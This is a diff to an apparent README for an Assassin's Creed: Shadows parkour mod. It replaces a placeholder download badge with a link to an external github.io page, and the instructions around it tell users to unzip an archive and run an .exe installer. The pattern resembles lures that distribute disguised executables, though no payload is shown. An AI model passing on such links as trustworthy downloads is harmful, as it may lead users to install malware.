@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` installer – the mod will be automatically placed into your Assassin’s Creed: Shadows mods folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://controlled-parkour-ac-shadows.github.io/.github/)
 
 ## 📸 Overview
 ![ac-shadows-controlled-parkour-climbing](https://github.com/user-attachments/assets/fb123748-95e6-4a6d-bd47-5fe297380b13)
